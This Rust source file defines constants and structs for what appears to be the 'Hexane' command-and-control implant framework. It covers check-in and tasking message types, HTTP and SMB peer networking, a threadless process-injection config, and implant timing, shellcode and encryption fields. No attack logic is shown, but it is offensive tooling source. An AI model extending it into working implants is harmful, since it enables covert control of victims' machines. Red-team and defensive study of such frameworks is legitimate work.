use serde::Deserialize;

const NETWORK_HTTP:         u32 = 0x00000001;
const NETWORK_PIPE:         u32 = 0x00000002;

const TYPE_CHECKIN:         u32 = 0x7FFFFFFF;
const TYPE_TASKING:         u32 = 0x7FFFFFFE;
const TYPE_RESPONSE:        u32 = 0x7FFFFFFD;
const TYPE_SEGMENT:         u32 = 0x7FFFFFFC;

const COMMAND_DIR:          u32 = 0x00000001;
const COMMAND_MODS:         u32 = 0x00000002;
const COMMAND_NO_JOB:       u32 = 0x00000003;
const COMMAND_SHUTDOWN:     u32 = 0x00000004;
const COMMAND_UPDATE_PEER:  u32 = 0x00000005;

const MINGW:    &str = "x86_64-w64-mingw32-g++";
const OBJCOPY:  &str = "objcopy";
const WINDRES:  &str = "windres";
const STRIP:    &str = "strip";
const NASM:     &str = "nasm";
const LINKER:   &str = "ld";

pub struct LinkedList<T> {
    pub(crate) head: Option<T>,
    pub(crate) next: Option<LinkedList<T>>,
}

#[derive(Deserialize)]
#[serde(tag = "Type", content = "Config")]
pub enum NetworkConfig {
    Http(HttpConfig),
    Smb(SmbConfig),
}

#[derive(Deserialize)]
#[serde(tag = "Type", content = "Config")]
pub enum InjectConfig {
    Threadless(Threadless),
}

#[derive(Deserialize)]
pub struct HttpConfig {
    pub(crate) address:    String,
    pub(crate) domain:     String,
    pub(crate) useragent:  String,
    pub(crate) port:       String,
    pub(crate) endpoints:  Vec<String>,
    pub(crate) headers:    Option<Vec<String>>,
    pub(crate) proxy:      Option<ProxyConfig>,
}

#[derive(Deserialize)]
pub struct SmbConfig {
    pub(crate) egress_name: String,
    pub(crate) egress_peer: String,
}

#[derive(Deserialize)]
pub struct ProxyConfig {
    pub(crate) address:    String,
    pub(crate) port:       String,
    pub(crate) proto:      String,
    pub(crate) username:   String,
    pub(crate) password:   String,
}

#[derive(Deserialize)]
pub struct Threadless {
    pub(crate) target_process:     String,
    pub(crate) target_module:      String,
    pub(crate) target_function:    String,
    pub(crate) loader_assembly:    String,
    pub(crate) execute_object:     String,
}

#[derive(Deserialize)]
pub struct MainConfig {
    pub(crate) debug:          bool,
    pub(crate) encrypt:        bool,
    pub(crate) architecture:   String,
    pub(crate) hostname:       String,
    pub(crate) working_hours:  String,
    pub(crate) killdate:       String,
    pub(crate) sleeptime:      i32,
    pub(crate) jitter:         i8,
}

#[derive(Deserialize)]
pub struct BuilderConfig {
    pub(crate) output_name:            String,
    pub(crate) root_directory:         String,
    pub(crate) linker_script:          String,
    pub(crate) dependencies:           Vec<String>,
    pub(crate) include_directories:    Vec<String>,
    pub(crate) loaded_modules:         Vec<String>,
}

#[derive(Deserialize)]
pub struct LoaderConfig {
    pub(crate) root_directory: String,
    pub(crate) linker_script:  String,
    pub(crate) rsrc_script:    String,
    pub(crate) sources:        Vec<String>,
    pub(crate) dependencies:   Vec<String>,
    pub(crate) injection:      InjectConfig,
}

#[derive(Deserialize)]
pub struct JsonData {
    pub(crate) config:     MainConfig,
    pub(crate) network:    NetworkConfig,
    pub(crate) builder:    BuilderConfig,
    pub(crate) loader:     LoaderConfig,
}

pub struct Parser {
    pub(crate) endian:     i8,
    pub(crate) peer_id:    u32,
    pub(crate) task_id:    u32,
    pub(crate) msg_type:   u32,
    pub(crate) msg_length: u32,
    pub(crate) msg_buffer: Vec<u8>,
}

pub struct CompilerConfig {
    pub(crate) file_extension:     String,
    pub(crate) build_directory:    String,
    pub(crate) compiler_flags:     Vec<String>,
}

pub struct UserSession {
    pub(crate) username: String,
    pub(crate) is_admin: bool,
}

pub struct Hexane {
    pub(crate) current_taskid: u32,
    pub(crate) peer_id:        u32,
    pub(crate) group_id:       i32,
    pub(crate) build_type:     i32,

    pub(crate) crypt_key:      Vec<u8>,
    pub(crate) shellcode:      Vec<u8>,
    pub(crate) config_data:    Vec<u8>,
    pub(crate) network_type:   u32,
    pub(crate) active:         bool,

    pub(crate) main:           MainConfig,
    pub(crate) compiler:       CompilerConfig,
    pub(crate) network:        NetworkConfig,
    pub(crate) builder:        BuilderConfig,
    pub(crate) loader:         LoaderConfig,
    pub(crate) user_session:   UserSession,
}

